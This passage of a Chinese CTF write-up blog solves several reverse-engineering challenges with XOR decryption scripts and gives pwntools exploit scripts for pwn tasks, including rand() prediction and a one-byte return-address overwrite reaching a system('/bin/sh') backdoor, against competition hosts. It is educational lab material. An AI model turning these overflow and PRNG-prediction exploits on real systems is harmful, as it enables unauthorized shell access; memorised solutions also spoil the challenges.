cmp_data[<span class="number">25</span>] = <span class="number">43</span>;</span><br><span class="line">  cmp_data[<span class="number">26</span>] = <span class="number">1</span>;</span><br><span class="line">  cmp_data[<span class="number">27</span>] = <span class="number">57</span>;</span><br><span class="line">  cmp_data[<span class="number">28</span>] = <span class="number">31</span>;</span><br><span class="line">  cmp_data[<span class="number">29</span>] = <span class="number">59</span>;</span><br><span class="line">  cmp_data[<span class="number">30</span>] = <span class="number">45</span>;</span><br><span class="line">  cmp_data[<span class="number">31</span>] = <span class="number">45</span>;</span><br><span class="line">  cmp_data[<span class="number">32</span>] = <span class="number">27</span>;</span><br><span class="line">  cmp_data[<span class="number">33</span>] = <span class="number">58</span>;</span><br><span class="line">  cmp_data[<span class="number">34</span>] = <span class="number">1</span>;</span><br><span class="line">  cmp_data[<span class="number">35</span>] = <span class="number">12</span>;</span><br><span class="line">  qmemcpy(&amp;cmp_data[<span class="number">36</span>], <span class="string">&quot;o96*#&quot;</span>, <span class="number">5</span>);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;Format);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%u&quot;</span>, &amp;inputString);</span><br><span class="line">  <span class="keyword">if</span> ( inputString &lt;= <span class="number">0x3E7</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    lenth = <span class="number">41</span>;</span><br><span class="line">    <span class="built_in">puts</span>(&amp;Buffer);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; lenth; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = cmp_data[i];</span><br><span class="line">      v5 = result(inputString);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, v4 ^ (v5 % <span class="number">0xD3</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(&amp;byte_40401C);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cmp_data = [<span class="number">0x0D</span>, <span class="number">0x07</span>, <span class="number">0x1D</span>, <span class="number">0x25</span>, <span class="number">0x1D</span>, <span class="number">0x6E</span>, <span class="number">0x30</span>, <span class="number">0x39</span>, <span class="number">0x2C</span>, <span class="number">0x3F</span>, <span class="number">0x2A</span>, <span class="number">0x2B</span>, <span class="number">0x32</span>, <span class="number">0x3F</span>, <span class="number">0x2A</span>, <span class="number">0x37</span>, <span class="number">0x6E</span>, <span class="number">0x30</span>, <span class="number">0x30</span>, <span class="number">0x30</span>, <span class="number">0x30</span>, <span class="number">0x2D</span>, <span class="number">0x01</span>, <span class="number">0x07</span>, <span class="number">0x31</span>, <span class="number">0x2B</span>, <span class="number">0x01</span>, <span class="number">0x39</span>, <span class="number">0x1F</span>, <span class="number">0x3B</span>, <span class="number">0x2D</span>, <span class="number">0x2D</span>, <span class="number">0x1B</span>, <span class="number">0x3A</span>, <span class="number">0x01</span>, <span class="number">0x0C</span>, <span class="number">0x6F</span>, <span class="number">0x39</span>, <span class="number">0x36</span>, <span class="number">0x2A</span>, <span class="number">0x23</span>, <span class="number">0x15</span>, <span class="number">0x40</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xd3</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> cmp_data:</span><br><span class="line">        byte = j ^ i;</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(byte),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="砍树"><a href="#砍树" class="headerlink" title="砍树"></a>砍树</h2><p>native 看下面调用str2应该是key</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">I0o0I</span><span class="params">(String str, String str2)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> String <span class="title function_">skkkyJNI</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    System.loadLibrary(<span class="string">&quot;ezreeeee&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>根据输入和key进行加密然后和dest cmp，大概是这样的一个逻辑</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __fastcall <span class="title function_">Java_com_sky_ezreeeee_MainActivity_I0o0I</span><span class="params">(__int64 a1, __int64 a2, __int64 a3, __int64 a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-64h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+10h] [rbp-60h]</span></span><br><span class="line">  _BOOL4 v7; <span class="comment">// [rsp+1Ch] [rbp-54h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 *v9; <span class="comment">// [rsp+20h] [rbp-50h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 *inputString; <span class="comment">// [rsp+28h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">40</span>]; <span class="comment">// [rsp+40h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v12; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  inputString = (<span class="type">unsigned</span> __int8 *)jstring_2unsigchar(a1, a3);</span><br><span class="line">  v9 = (<span class="type">unsigned</span> __int8 *)jstring_2unsigchar(a1, a4);</span><br><span class="line">  v6 = A0OWO0A(inputString, v9);</span><br><span class="line">  <span class="built_in">memcpy</span>(dest, &amp;byte_14900, <span class="number">0x23</span>uLL);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">34</span>; ++i )</span><br><span class="line">    v7 = *(<span class="type">unsigned</span> __int8 *)(v6 + i) == (<span class="type">unsigned</span> __int8)dest[i];</span><br><span class="line">  <span class="keyword">return</span> v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>A0OWO0A的实现</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int8 *__fastcall <span class="title function_">A0OWO0A</span><span class="params">(<span class="type">unsigned</span> __int8 *inputString, <span class="type">const</span> <span class="type">unsigned</span> __int8 *key)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">34</span>; ++i )</span><br><span class="line">    inputString[i] ^= key[i % <span class="number">7</span>];</span><br><span class="line">  <span class="keyword">return</span> inputString;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>解密脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">flag = [<span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x20</span>, <span class="number">0x17</span>, <span class="number">0x1B</span>, <span class="number">0x36</span>, <span class="number">0x0E</span>, <span class="number">0x36</span>,</span><br><span class="line">        <span class="number">0x26</span>, <span class="number">0x17</span>, <span class="number">0x04</span>, <span class="number">0x2A</span>, <span class="number">0x29</span>, <span class="number">0x07</span>, <span class="number">0x26</span>, <span class="number">0x15</span>,</span><br><span class="line">        <span class="number">0x52</span>, <span class="number">0x33</span>, <span class="number">0x2D</span>, <span class="number">0x0F</span>, <span class="number">0x3A</span>, <span class="number">0x27</span>, <span class="number">0x11</span>, <span class="number">0x06</span>,</span><br><span class="line">        <span class="number">0x33</span>, <span class="number">0x07</span>, <span class="number">0x46</span>, <span class="number">0x17</span>, <span class="number">0x3D</span>, <span class="number">0x0A</span>, <span class="number">0x3C</span>, <span class="number">0x38</span>,</span><br><span class="line">        <span class="number">0x2E</span>, <span class="number">0x22</span>, <span class="number">0x18</span>]</span><br><span class="line"></span><br><span class="line">a = <span class="string">&quot;Sycloverforerver&quot;</span></span><br><span class="line">key = [<span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> a]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    byte = flag[i] ^ key[i % <span class="number">7</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(byte),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="听说cpp很难？"><a href="#听说cpp很难？" class="headerlink" title="听说cpp很难？"></a>听说cpp很难？</h2><p>无用的代码比较多，这时候应该从后往前分析，从success的逻辑开始往前找，发现关键的加密逻辑，也是就test67那</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( k = std::vector&lt;<span class="type">char</span>&gt;::<span class="built_in">begin</span>(v16); ; __gnu_cxx::__normal_iterator&lt;<span class="type">char</span> *,std::vector&lt;<span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>++(</span><br><span class="line">                                             &amp;k,</span><br><span class="line">                                             <span class="number">0</span>i64) )</span><br><span class="line">&#123;</span><br><span class="line">  v21 = std::vector&lt;<span class="type">char</span>&gt;::<span class="built_in">end</span>(v16);</span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="type">unsigned</span> __int8)__gnu_cxx::<span class="keyword">operator</span>!=&lt;<span class="type">char</span> *,std::vector&lt;<span class="type">char</span>&gt;&gt;(&amp;k, &amp;v21) )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  v6 = (_BYTE *)__gnu_cxx::__normal_iterator&lt;<span class="type">char</span> *,std::vector&lt;<span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>*(&amp;k);</span><br><span class="line">  *v6 += v17[<span class="number">44</span>];</span><br><span class="line">  v7 = *(<span class="type">char</span> *)__gnu_cxx::__normal_iterator&lt;<span class="type">char</span> *,std::vector&lt;<span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>*(&amp;k);</span><br><span class="line">  v8 = (_BYTE *)__gnu_cxx::__normal_iterator&lt;<span class="type">char</span> *,std::vector&lt;<span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>*(&amp;k);</span><br><span class="line">  *v8 = <span class="built_in">text_67</span>(v17, v7);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">text_67</span><span class="params">(__int64 a1, <span class="type">char</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">40</span>) = <span class="number">9</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> __int8)(((*(_DWORD *)(a1 + <span class="number">40</span>) + <span class="number">1</span>) ^ a2) - *(_DWORD *)(a1 + <span class="number">40</span>) - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也就是这个逻辑，test_67外边可以一个*v6 +&#x3D; v17[44];的逻辑，打开看了一下是0xa</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(inputString[i] ^ 10) - 9 - 1</span><br></pre></td></tr></table></figure>

<p>所以也就是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((cmpStr[i] + 10) ^ 10) - 0xa</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">v19 = [</span><br><span class="line">    <span class="number">77</span>, <span class="number">95</span>, <span class="number">61</span>, -<span class="number">123</span>, <span class="number">55</span>, <span class="number">104</span>, <span class="number">115</span>, <span class="number">87</span>, <span class="number">39</span>, <span class="number">104</span>,</span><br><span class="line">    <span class="number">81</span>, <span class="number">89</span>, <span class="number">127</span>, <span class="number">38</span>, <span class="number">107</span>, <span class="number">89</span>, <span class="number">115</span>, <span class="number">87</span>, <span class="number">85</span>, <span class="number">91</span>,</span><br><span class="line">    <span class="number">89</span>, <span class="number">111</span>, <span class="number">106</span>, <span class="number">89</span>, <span class="number">39</span>, <span class="number">87</span>, <span class="number">114</span>, <span class="number">87</span>, <span class="number">79</span>, <span class="number">87</span>,</span><br><span class="line">    <span class="number">120</span>, <span class="number">120</span>, -<span class="number">125</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v19)):</span><br><span class="line">    v19[i] = ((v19[i] + <span class="number">10</span>) ^ <span class="number">10</span>) - <span class="number">0xa</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> v19:</span><br><span class="line">    <span class="keyword">if</span> i &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>



<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="nc-pwntools"><a href="#nc-pwntools" class="headerlink" title="nc_pwntools"></a>nc_pwntools</h2><p>可以用ctypes来调用libc中的srand rand</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./chal&#x27;</span>)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">libc.srand(libc.time(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_debug):</span><br><span class="line">    p = process()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ip = <span class="string">&quot;pwn.node.game.sycsec.com&quot;</span></span><br><span class="line">    port = <span class="number">31955</span></span><br><span class="line">    p = remote(ip,port)</span><br><span class="line">       </span><br><span class="line"><span class="comment"># send() sendline() sendafter() sendlineafter()</span></span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(sa)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># recv() recvline() recvuntil()</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> x: p.recvline(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">92</span> + <span class="string">b&#x27;Syclover&#x27;</span></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">random_number1 = libc.rand() % <span class="number">100000</span> + <span class="number">5646488</span>;</span><br><span class="line">random_number2 = libc.rand() % <span class="number">10000</span> + <span class="number">3214590</span>;</span><br><span class="line">random_number3 = libc.rand() % <span class="number">1000</span> + <span class="number">6521</span>;</span><br><span class="line">random_number4 = libc.rand() % <span class="number">10000</span> + <span class="number">98714</span>;</span><br><span class="line"></span><br><span class="line">result = (random_number1 - random_number2) * random_number3 % random_number4</span><br><span class="line">result = <span class="built_in">str</span>(result).encode()</span><br><span class="line">p.sendline(result)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>程序开启了pie，但是backdoor和vuln的偏移非常近，不超过一个字节的偏移，原有的return上面就已经有了前面部分的地址，所以只需要覆盖低位一个字节的内容，就能return到backdoor上面</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">000000000000120</span>E F3 <span class="number">0F</span> <span class="number">1</span>E FA                   endbr64</span><br><span class="line">.text:<span class="number">0000000000001212</span> <span class="number">55</span>                            push    rbp</span><br><span class="line">.text:<span class="number">0000000000001213</span> <span class="number">48</span> <span class="number">89</span> E5                      mov     rbp, rsp</span><br><span class="line">.text:<span class="number">0000000000001216</span> <span class="number">48</span> <span class="number">83</span> EC <span class="number">10</span>                   sub     rsp, <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">000000000000121</span>A C7 <span class="number">45</span> FC <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov     [rbp+var_4], <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000001221</span> <span class="number">83</span> <span class="number">7</span>D FC <span class="number">01</span>                   cmp     [rbp+var_4], <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000001225</span> <span class="number">75</span> <span class="number">11</span>                         jnz     <span class="type">short</span> loc_1238</span><br><span class="line">.text:<span class="number">0000000000001225</span></span><br><span class="line">.text:<span class="number">0000000000001227</span> <span class="number">48</span> <span class="number">8</span>D <span class="number">3</span>D DA <span class="number">0</span>D <span class="number">00</span> <span class="number">00</span>          lea     rdi, command                    ; <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">.text:<span class="number">000000000000122</span>E B8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000001233</span> E8 <span class="number">58</span> FE FF FF                call    _system</span><br><span class="line">.text:<span class="number">0000000000001233</span></span><br><span class="line">.text:<span class="number">0000000000001238</span></span><br><span class="line">.text:<span class="number">0000000000001238</span>                               loc_1238:                               ; CODE XREF: backdoor+<span class="number">17</span>↑j</span><br><span class="line">.text:<span class="number">0000000000001238</span> <span class="number">90</span>                            nop</span><br><span class="line">.text:<span class="number">0000000000001239</span> C9                            leave</span><br><span class="line">.text:<span class="number">000000000000123</span>A C3                            retn</span><br><span class="line">.text:<span class="number">000000000000123</span>A                               ; &#125; /</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">000000000000123B</span>                               ; __unwind &#123;</span><br><span class="line">.text:<span class="number">000000000000123B</span> F3 <span class="number">0F</span> <span class="number">1</span>E FA                   endbr64</span><br><span class="line">.text:<span class="number">000000000000123F</span> <span class="number">55</span>                            push    rbp</span><br><span class="line">.text:<span class="number">0000000000001240</span> <span class="number">48</span> <span class="number">89</span> E5                      mov     rbp, rsp</span><br><span class="line">.text:<span class="number">0000000000001243</span> <span class="number">48</span> <span class="number">83</span> EC <span class="number">50</span>                   sub     rsp, <span class="number">50</span>h</span><br><span class="line">.text:<span class="number">0000000000001247</span> <span class="number">48</span> <span class="number">8</span>D <span class="number">3</span>D C2 <span class="number">0</span>D <span class="number">00</span> <span class="number">00</span>          lea     rdi, s                          ; <span class="string">&quot;The simplest but not too simple pwn&quot;</span></span><br><span class="line">.text:<span class="number">000000000000124</span>E E8 <span class="number">2</span>D FE FF FF                call    _puts</span><br><span class="line">.text:<span class="number">000000000000124</span>E</span><br><span class="line">.text:<span class="number">0000000000001253</span> <span class="number">48</span> <span class="number">8</span>D <span class="number">45</span> B0                   lea     rax, [rbp+buf]</span><br><span class="line">.text:<span class="number">0000000000001257</span> BA <span class="number">60</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                mov     edx, <span class="number">60</span>h ; <span class="string">&#x27;`&#x27;</span>                  ; nbytes</span><br><span class="line">.text:<span class="number">000000000000125</span>C <span class="number">48</span> <span class="number">89</span> C6                      mov     rsi, rax                        ; buf</span><br><span class="line">.text:<span class="number">000000000000125F</span> BF <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                mov     edi, <span class="number">0</span>                          ; fd</span><br><span class="line">.text:<span class="number">0000000000001264</span> B8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000001269</span> E8 <span class="number">32</span> FE FF FF                call    _read</span><br><span class="line">.text:<span class="number">0000000000001269</span></span><br><span class="line">.text:<span class="number">000000000000126</span>E <span class="number">90</span>                            nop</span><br><span class="line">.text:<span class="number">000000000000126F</span> C9                            leave</span><br><span class="line">.text:<span class="number">0000000000001270</span> C3                            retn</span><br><span class="line">.text:<span class="number">0000000000001270</span>                               ; &#125; <span class="comment">// starts at 123B</span></span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./ret2text&#x27;</span>)</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_debug):</span><br><span class="line">    p = process()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ip = <span class="string">&quot;1.container.jingsai.apicon.cn&quot;</span></span><br><span class="line">    port = <span class="number">30926</span></span><br><span class="line">    p = remote(ip,port)</span><br><span class="line">       </span><br><span class="line"><span class="comment"># send() sendline() sendafter() sendlineafter()</span></span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(sa)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># recv() recvline() recvuntil()</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> x: p.recvline(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x50</span> + <span class="number">0x8</span>)</span><br><span class="line">payload += p8(<span class="number">0x27</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="password"><a href="#password" class="headerlink" title="password"></a>password</h2><p>有一个backdoor函数，name那存在一个溢出，刚刚好是八个字节，能覆盖返回地址，password这里是通过read &#x2F;dev&#x2F;urandom来生成的，去看了下urandome 有时候会出来\x00，想到strcmp 是根据\x00来识别字符串，再cmp的，那假设第一位是\x00，爆破password</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+40h] [rbp-20h] 